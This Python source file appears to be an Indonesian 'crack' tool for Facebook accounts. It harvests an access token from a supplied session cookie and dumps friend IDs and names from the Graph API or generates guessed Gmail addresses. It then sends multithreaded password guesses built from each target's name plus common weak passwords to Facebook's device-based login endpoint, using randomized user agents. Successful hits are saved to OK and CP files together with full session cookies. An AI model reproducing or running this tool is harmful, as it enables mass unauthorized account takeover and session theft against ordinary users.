" JANGAN DI PREM KAN BANSAD "
By  :  " A M R I N "
Github : " Amrin-501 "
Facebook : " A M R I N "

" MODULE "
import os
import re
import sys
import bs4
import time
import random
import requests
import base64
import datetime
from time import sleep
import requests,bs4,uuid,json,os,sys,random,datetime,time,re
from concurrent.futures import ThreadPoolExecutor as tred
from rich.progress import Progress,SpinnerColumn,TextColumn
from rich.progress import BarColumn,TimeElapsedColumn
ses = requests.Session()

" APPEND "
id,id2,uid=[],[],[]
(
	loop,
	ok,
	cp,
	ugen,
	method,
	akun,
	dump,
	password_list,
	password_input,
	pwpluss,
	pwnya,
)	=	(
	0,
	0,
	0,
	[],
	[],
	[],
	[],
	[],
	[],
	[],
	[],
	)
	
" WARNA "
P = '\x1b[1;97m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
M = '\x1b[1;91m'
B = '\x1b[1;94m'
O = '\x1b[1;96m'
N = '\x1b[0m'
J = '\x1b[38;5;208m'

P2 = "[#FFFFFF]"
H2 = "[#00FF00]"
K2 = "[#FFFF00]"
M2 = "[#FF0000]"
B2 = "[#00C8FF]"
A2 = "[#AAAAAA]"

dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
sekarang = str(tgl)+"-"+str(bln)+"-"+str(thn)

" RESULT OK CP "
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def Kalender():
		perharian_time = time.localtime(time.time())
		hari = [
"SENIN", 
	"SELASA", 
		"RABU", 
			"KAMIS", 
				"JUMAT", 
					"SABTU",
						"MINGGU"
];hari = hari[perharian_time.tm_wday];return hari
hari = Kalender();hari = f"{hari}"

" JAM GANDA "
jam = time.strftime(
		"%H."
	"%M"
)

import datetime
now = datetime.datetime.now()
hours = now.hour
if hours < 4:waktu_zona = "Dini"
elif 4 <= hours < 12:waktu_zona = "Pagi"
elif 12 <= hours < 15:waktu_zona = "Siang"
elif 15 <= hours < 18:waktu_zona = "Sore"
else:waktu_zona = "Malam"

" TAHUN AKUN "
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']:tahunz = '2010'
		elif fx[:6] in ['100002']:tahunz = '2011'
		elif fx[:6] in ['100003']:tahunz = '2012'
		elif fx[:6] in ['100004']:tahunz = '2012'
		elif fx[:6] in ['100005']:tahunz = '2013'
		elif fx[:6] in ['100006']:tahunz = '2013'
		elif fx[:6] in ['100007']:tahunz = '2014'
		elif fx[:6] in ['100008']:tahunz = '2015'
		elif fx[:6] in ['100009']:tahunz = '2015'
		elif fx[:5] in ['10001']:tahunz = '2016'
		elif fx[:5] in ['10002']:tahunz = '2017'
		elif fx[:5] in ['10003']:tahunz = '2018'
		elif fx[:5] in ['10004']:tahunz = '2019'
		elif fx[:5] in ['10005']:tahunz = '2020'
		elif fx[:5] in ['10006']:tahunz = '2021'
		elif fx[:5] in ['10007']:tahunz = '2021'
		elif fx[:5] in ['10008']:tahunz = '2022'
		elif fx[:5] in ['10009']:tahunz = '2023'
		elif fx[:2] in ['61']:tahunz = '2023-2024'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz

def Bersih_Terminal():
	os.system(
'clear'
	)
def Back():
	Menu_nya()
def Logo():
	print(f"""
{P}  _____  
{P} / ___/__     {P}Status/{H}Free
{H}/ /__{P}(_-<   {P}Crack Simple
{H}\___/___/  {P}By : {H}A M R I N
{N}≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈""")
	
" COOKIES "
class Login:
	def __init__(self):
		Bersih_Terminal();Logo()
		warna = random.choice([
 P, M, H, K, B, N])
		try:
			cok = input(f'\n{P}cookies : {H}')
			Loading()
			head = {
			"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"
			}
			link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok});find = re.findall('act=(.*?)&nav_source', link.text)
			if len(find) == 0:print(f'{P}cookie kamu invalid silahkan menggunakan tumbal/cookies lain.');time.sleep(2);exit()
			else:
				for x in find:
					xz = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok});took = re.search('(EAAB\w+)',xz.text).group(1);open('.tok.txt', 'a').write(took);open('.cok.txt', 'a').write(cok)
					exit(f"\n{P}token : {H}{took}{P} \nlogin berhasil ketik ulang, python crack_simple.py")
		except Exception as e:exit(e)
def Loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r {N}[{H}•{N}] {H}Loading...{N} " + animation[i % len(animation)] +"\x1b[0m ");sys.stdout.flush()

" MENU TOOLS "
class Menu_nya:
	def __init__(self):
		Bersih_Terminal();Logo()
		try:
			token = open('.tok.txt','r').read();cok = open('.cok.txt','r').read()
		except (IOError,KeyError,FileNotFoundError):
			print(f'\n{P}cookies kamu invalid.{P}');time.sleep(2);os.system('clear');Login()
		try:
			info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json();nama = info_datafb["name"];uidfb = info_datafb["id"]
		except requests.exceptions.ConnectionError:
			exit(f"\n{P}Tidak ada koneksi{P}")
		except KeyError:
			try:os.remove(".cok.txt");os.remove(".tok.txt")
			except:pass
			Bersih_Terminal();Logo()
		print(f"\n{B}[{P}1{B}]{N}.{P} Crack Publik\n{B}[{P}2{B}]{N}.{P} Crack File\n{B}[{P}3{B}]{N}.{P} Crack Email\n{B}[{P}4{B}]{N}.{P} Result {H}ok{B}/{K}cp\n{B}[{M}E{B}]{N}.{P} Exit {M}Cookies")
		Menu_Tools = input(f"{P}Chose : ")
		if Menu_Tools in ["1"]:
			idt = input(f"\n{P}Masukan idz : ")
			dump(idt,"",{"cookie":cok},token)
			Atur_men()
		elif Menu_Tools in ["2"]:Crack_file()
		elif Menu_Tools in ["3"]:Crack_email()
		elif Menu_Tools in ["4"]:Result_ok_cp()
		elif Menu_Tools in ["5"]:Dump_massal()
		elif Menu_Tools in ["E"]:
			os.system("rm -rf .tok.txt");os.system("rm -rf .cookie.txt");print(f"Sukses hapus Cookies");exit()

" DUMP PUBLIK "
def dump(idt,fields,cookie,token):
	try:
		headers = {
				"connection": "keep-alive", "accept": "*/*", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors","sec-fetch-site": "same-origin", "sec-fetch-user": "?1","sec-ch-ua-mobile": "?1","upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9"
				}
		if len(id) == 0:
			params = {
					"access_token": token,"fields": f"name,friends.fields(id,name,birthday)"
				}
		else:
			params = {
					"access_token": token,"fields": f"name,friends.fields(id,name,birthday).after({fields})"
					}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			id.append(i["id"]+"|"+i["name"]);sys.stdout.write(f"\r{P}Sedang proses dump idz : {H}{len(id)}{P} ");sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass

" CRACK FILE "
class Crack_file:
	def __init__(self):
		print(f"\n{P}Masukan nama File contoh : {K}janda.txt")
		file = input(f"{P}File : ")
		try:
			uid = open(file,"r").read().splitlines()
			for data in uid:
				try:user,nama = data.split('|')
				except:continue
				sys.stdout.write(f"\r{P}Total idz Terkumpul : {H}{len(id)}");sys.stdout.flush()
				id.append(data)
		except FileNotFoundError:exit(f"File Kosong")
		Atur_men()

" CRACK EMAIL "
class Crack_email:
	def __init__(self):
		dump=[]
		rc = random.choice
		rr = random.randint
		xc = ['resky','reski','olivia','oliv','ratna','ratni','alvia','alvi','fery','feri','andika','andi','andri','andre','abiyah','abdilla','aca','acha','acaa','achaa','ai','aii','adawiah','adawiyah','ade','adel','adell','adel','adellaa','adelia','adellia','adeliya','adiba','adifa','adinda','aeni','aidah','aini','ainun','aira','asiah','aisah','aisyah','afifah','afipah','alawiah','alawiyah','alfatunisa','alfatunnisa','agnes','agnesia','ajahra','ajeng','ajeung','ajig','ajijah','ajizah','ajg','alesha','alia','alika','alimah','aliya','alifa','alifah','aliva','alivah','aliyah','almeera','almira','ama','amalia','amaliag','amaliyah','amanda','amidah','amira','aminah','ana','anantasia','anantasya','anastasia','anastasya','agnes','andini','ani','anisa','anita','any','anying','anyun','angela','angelina','anggraeni','anggraini','anggi','anggita','anggun','anjas','anjasmara','anjay','anugerah','anugrah','anjing','apifah','apipah','april','aprilia','aprillia','apriliani','apriliyani','aprilianti','apriliyanti','aqila','aqilla','ara','arra','arafah','arrafah','areta','aretha','arofah','arin','arini','ariani','arista','ariyani','aryani','aryanti','arianti','ariyanti','arumi','arsita','arsyita','arsila','asyila','asypa','asifa','asipa','asmi','asmara','asih','asilah','asti','astiani','astiyani','astuti','atik','atika','atikah','ayg','ayank','ayang','ayra','ayu','ayyu','ayunda','ayuni','ayudia','ayudiya','ayudiah','ayuningsih','azzahra','azijah','azizah','azmi','azmy','azura','babi','baby','badriah','bajingan','bagong','bandung','bngst','bangsat','bela','bella','bibah','bila','billa','belinda','betharia','bintang','briana','britania','briela','briyana','budiarti','bulan','bunga','bungsu','bunyamin','butet','ca','cabi','cabhy','caby','cabby','caca','cca','cahaya','cahya','cahyani','cahyaningsih','caitlyn','camelia','cangcut','can','cans','canss','cantik','cantika','caroline','charrisa','catherine','cassandra','celine','cecilia','celsi','celsie','centil','chaca','chacha','chelsi','chelsie','chelsea','chesi','chessy','chika','cia','cci','cici','cika','cimok','cindy','cinta','cintia','cintaku','cintya','cintiya','citra','chindy','claudya','cucu','ccu','culun','cupu','cynthia','cyntia','dafin','dahlia','daiba','dania','daniah','daniyah','danyyah','daswita','dara','davina','darsie','dawy','de','dea','dede','dela','della','delia','delicia','denia','deniah','deniyah','deon','debi','deby','debby','denita','denisa','devi','devia','devie','desnia','desnie','divita','desi','desita','deswita','dewandana','dwi','dewi','dewita','dhairya','dhara','dhe','dhea','dheniah','dhewi','dhita','dhiya','dia','diah','diajeng','dian','diana','diandra','diannova','dias','diinah','dika','diksa','dila','dilla','dipa','divhla','dianda','dila','dilla','dira','dina','dinda','dini','diniah','diniyah','disa','disha','dita','divya','dixha','diya','diyah','diyara','dnya','dona','dyra','dyah','dzafina','djakarta','eka','elailah','elaina','eira','eisha','elaina','elda','elea','elena','eleanor','eleadoer','eleha','eletha','elfie','elga','elia','eliana','elicia','elika','elin','elina','elisabeth','elis','ellis','elise','eliya','eliza','elizabeth','ella','ellen','elliana','ellie','elma','elmira','elora','elisa','elisha','elisia','elisiya','elisya','elisyha','elsye','elfina','elsa','evi','epi','elisabeth','elin','elsy','elva','elvira','elly''elvina','elzahra','embun','emeline','ekavira','emery','emi','emilia','emy','emyliya','ema','emma','emily','emira','endah','endang','epi','erna','erni','eri','erika','erina','erlinda','esti','estiana','eis','eti','etie','ety','euis','eva','evi','evita','evitamala','evalina','evelyn','ewe','fara','farah','farrah','fadila','fadla','fadhila','fadhla','faija','faiza','faizza','faizah','fani','fanni','fany','fanny','fanya','farhah','farhana','farida','faridha','fasya','fasha','fathia','fatin','fatina','fatthyyah','faujia','faujiah','fauzia','fauziah','fauziya','fauzyah','fawziyah','fazila','fazilla','fazeela','fatim','fatima','fatimah','fathimah','felisia','felisya','ferli','ferly','ferlyani','fika','fina','fiona','fionna','fida','fira','firli','firly','firlly','firliani','firliyani','fita','fitri','fitriani','fitriyani','fitryani','fiska','fizka','fiza','frisilia','frisiliya','freya','friska','fuji','fuzi']
		blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep','90','96','25']
		global ok , cc
		nama = input(f'\n{P}nama target : ')
		if ',' in str(nama):
			print(f'masukan nama, jangan kosong ')
			time.sleep(3);exit()
		doma = '@gmail.com'
		jumlah = input(f'{P}Jumlah Dump : ')
		for xyz in range(int(jumlah)):
			AA = nama
			BB = [f'{str(rc(xc))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(xc))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(xc))}{str(rc(blk))}']
			CC = doma
			DD = f'{AA}{str(rc(BB))}{CC}'
			if DD in id:pass
			else:id.append(DD+'|'+nama)
			if len(dump)==999999:setting()
			sys.stdout.write(f"\r{P}Total dump Terkumpul : {H}{len(id)}");sys.stdout.flush()
			time.sleep(0.0000003)
		Atur_men()

" RESULT OK CP "
def Result_ok_cp():
	print('\n╰ \033[0m1. Hasil \033[33mCP \033[0mAnda ')
	print('╰ \033[0m2. Hasil \033[32mOK \033[0mAnda ')
	print('╰ 0. Kembali	')
	kz = input('\n╰ Chouse : ')
	print('')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('╰ File Tidak Di Temukan ')
			time.sleep(3)
			Back()
		if len(vin)==0:
			print('╰ Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			Back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(''+nom+'. '+isi+'\033[33m '+str(len(hem))+' \033[0mcekpoint '+N)
				else:
					lol.update({str(cih):str(isi)})
					print(''+str(cih)+'. '+isi+'\033[33m '+str(len(hem))+' \033[0mcekpoint '+N)
			geeh = input('\n╰ Chouse : ')
			print('')
			try:geh = lol[geeh]
			except KeyError:
				print('╰ Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('╰ File Tidak Di Temukan ')
				time.sleep(2)
				Back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'╰ CP\033[33m {cpkuni[0]}|{cpkuni[1]}\033[0m')
				nocp +=1
			input('\n╰ Back Enter ')
			Back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('╰ File Tidak Di Temukan ')
			time.sleep(2)
			Back()
		if len(vin)==0:
			print('╰ Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			Back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(''+nom+'. '+isi+'\033[32m '+str(len(hem))+' \033[0mSucses '+N)
				else:
					lol.update({str(cih):str(isi)})
					print(''+str(cih)+'. '+isi+'\033[32m '+str(len(hem))+' \033[0mSucses '+N)
			geeh = input('\n╰ Chouse : ')
			try:geh = lol[geeh]
			except KeyError:
				print('╰ Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('╰ File Tidak Di Temukan ')
				time.sleep(2)
				Back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'\n╰ OK\033[32m {cpkuni[0]}|{cpkuni[1]}|\033[32m{cpkuni[2]}\033[0m')
				nocp +=1
			input('\n╰ Back Enter ')
			Back()
	elif kz in ['0','00']:
		Back()
	else:
		print('╰ Pilih Yang Bener Kontol ')
		exit()

" ATUR KREK "
class Atur_men:
	def __init__(self):
		print()
		for ngacak in id:
			id2.insert(0,ngacak)
		else:
			method.append("validate")
		
		print(f"\n{B}[{P}1{B}]{P} Sandi{M}.{P}Gabungan\n{B}[{P}2{B}]{P} Sandi{M}.{P}Otomatis")
		Psw = input(f"{P}Chose : ")
		if Psw in ["1","01"]:Gabungan(self)
		elif Psw in ["2","02"]:Otomatis(self)
		else:Otomatis(self)
		
" SANDI GABUNGAN "
def Gabungan(self):
	global Rdn,Amrin
	pw_gabung = input(f"\n{P}Masukan sandi tambahan : ")
	password_gabung = pw_gabung.split(",")
	for xpw in password_gabung:
		pwnya.append(xpw)
	print(f"\n{B}[{M}≈{B}] {P}Start Crack {H}{waktu_zona} {P}{hari} {K}{time.strftime('%H.%M')}")
	print(f"{N}≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈")
	print(f"{P}ON/OFF MODE PESAWAT (5 detik) SETIAP {B}300 {P}IDZ")
	print(f"{N}≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈\n")
	awal = datetime.datetime.now()
	Rdn = Progress(SpinnerColumn('clock'),TextColumn('{task.description} ['),BarColumn(),TextColumn('] {task.percentage:.0f}%'))
	Amrin = Rdn.add_task('',total=len(id))
	with Rdn:
		with tred(max_workers=30) as start:
			for account in id2:
				idz,nama_lengkap = account.split('|')[0],account.split('|')[1].lower()
				nama_depan = nama_lengkap.split(" ")[0]
				pwd = []
				try:
					if len(nama_lengkap)<6:
						if len(nama_depan)<3:pass
						else:
							pwd.append(nama_depan+"123");pwd.append(nama_depan+"1234");pwd.append(nama_depan+"12345")
					else:
						if len(nama_depan)<3:pwd.append(nama_lengkap)
						else:
							pwd.append(nama_lengkap);pwd.append(nama_depan+"123");pwd.append(nama_depan+"1234");pwd.append(nama_depan+"12345")
					if 'validate' in method:
						start.submit(Validate,self,idz,pwd,awal)
				except:pass
		print("\r")
		exit(f"\n{P}Selesai Crack ({J}{hari}{P}) Total - OK:{H}{ok}  {P}CP:{K}{cp}\n")

	
" SANDI OTOMATIS "
def Otomatis(self):
	global Rdn,Amrin
	print(f"\n{B}[{M}≈{B}] {P}Start Crack {H}{waktu_zona} {P}{hari} {K}{time.strftime('%H.%M')}")
	print(f"{N}≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈")
	print(f"{P}ON/OFF MODE PESAWAT (5 detik) SETIAP {B}300 {P}IDZ")
	print(f"{N}≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈\n")
	awal = datetime.datetime.now()
	Rdn = Progress(SpinnerColumn('clock'),TextColumn('{task.description} ['),BarColumn(),TextColumn('] {task.percentage:.0f}%'))
	Amrin = Rdn.add_task('',total=len(id))
	with Rdn:
		with tred(max_workers=30) as start:
			for account in id2:
				idz,nama_lengkap = account.split('|')[0],account.split('|')[1].lower()
				nama_depan = nama_lengkap.split(" ")[0]
				pwd = ["bagong","jancok","sayang","bengkulu","memekk","123456"]
				try:
					if len(nama_lengkap)<6:
						if len(nama_depan)<3:pass
						else:
							pwd.append(nama_depan+"123");pwd.append(nama_depan+"1234");pwd.append(nama_depan+"12345")
					else:
						if len(nama_depan)<3:pwd.append(nama_lengkap)
						else:
							pwd.append(nama_lengkap);pwd.append(nama_depan+"123");pwd.append(nama_depan+"1234");pwd.append(nama_depan+"12345");pwd.append(nama_depan+"321");pwd.append(nama_depan+"12");pwd.append(nama_depan+"21");pwd.append(nama_depan+"01");pwd.append(nama_depan+"02");pwd.append(nama_depan+"03");pwd.append(nama_depan+"04");pwd.append(nama_depan+"05");pwd.append(nama_depan+"06");pwd.append(nama_depan+"07");pwd.append(nama_depan+"08");pwd.append(nama_depan+"09");pwd.append(nama_depan+"10")
					if 'validate' in method:
						start.submit(Validate,self,idz,pwd,awal)
				except:pass
		print("\r")
		exit(f"\n{P}Selesai Crack ({J}{hari}{P}) Total - OK:{H}{ok}  {P}CP:{K}{cp}\n")
	
def Ua_validate():
	rr = random.randint
	rc = random.choice
	pek = rr(10,105)
	pekk = rc(["5.1","6.0.1","7.0","7.1.2","8.0.1","9","10","11","12","13"])
	pepek = rc([f"Version/{str(rr(2,4))}.0 Chrome/{pek}.0.{str(rr(1000,5500))}.{str(rr(45,250))}",f"Chrome/{pek}.0.{str(rr(1000,5500))}.{str(rr(45,250))}"])
	return1 = f"Mozilla/5.0 (Linux; Android 10; {pekk}; S40Pro Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) {pepek} Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36"
	return2 = f"Mozilla/5.0 (Linux; Android {pekk}; V2203 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) {pepek} Mobile Safari/537.36[FBAN/EMA;FBLC/pt_PT;FBAV/360.0.0.7.53;]"
	return rc([return1,return2])
	Pepek = random.choice(['Pixel 3','Pixel 6 Pro','Pixel 4a','Pixel 5','Pixel 6a',])
	return f"Mozilla/5.0 (Linux; Android 10; S40Pro Build/QP1A.190711.020) {pekk}; {Pepek}) AppleWebKit/537.36 (KHTML, like Gecko) {pepek} Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36"

def Validate(self,idz,pwd,awal):
	global loop,ok,cp
	waktu_nya = str(datetime.datetime.now()-awal).split('.')[0]
	Rdn.update(Amrin,description=f"\r[bold yellow]{waktu_nya} [bold blue][{P2}{len(id)}{B}/{P2}{(loop)}[bold blue]] [bold green]OK{P2}:[bold green]{(ok)} [bold yellow]CP{P2}:[bold yellow]{(cp)}{N}")
	Rdn.advance(Amrin)
	ses = requests.Session()
	for pw in pwd:
		try:
			ua = Ua_validate()
			link = ses.get(f"https://free.prod.facebook.com/login/device-based/password/?uid={idz}&flow=login_no_pin&skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
			data = {
			"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),
			"uid": idz,
			"next": "https://free.prod.facebook.com/v3.3/dialog/oauth?client_id=190291501407&redirect_uri=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback&scope=email&response_type=code&state=pxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5&ret=login&fbapp_pres=0&logger_id=dd58b980-4f31-44c0-9524-5490fc11be47&tp=unspecified",
			"flow": "login_no_pin",
			"pass":pw}
			hd = {"Host": "free.prod.facebook.com",
			"content-length": "479",
			"cache-control": "max-age=0",
			"upgrade-insecure-requests": "1",
			"origin": "https://free.prod.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"x-requested-with": "com.opera.mini.native",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "navigate",
			"sec-fetch-user": "?1","sec-fetch-dest": "document",
			"referer": f"https://free.prod.facebook.com/login/device-based/password/?uid={idz}&flow=login_no_pin&skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			post = ses.post("https://free.prod.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=data, headers=hd, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f"\r{B}[{H}{time.strftime('%H.%M')}{B}]{P} : {H}{idz} ~ {pw}{M} ~ {B}{tahun(idz)}")
				print(f"\r{H}{kuki}{N}")
				open('OK/'+okc,'a').write(idz+'|'+pw+'|'+kuki+'\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				print(f"\r{B}[{K}{time.strftime('%H.%M')}{B}]{P} : {K}{idz} ~ {pw}{M} ~ {B}{tahun(idz)}")
				open('CP/'+cpc,'a').write(idz+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1


if __name__=='__main__':
	try:
		os.mkdir(
			'OK'
)
	except:
		pass
	try:
		os.mkdir(
			'CP'
)
	except:
		pass
	Menu_nya()
 	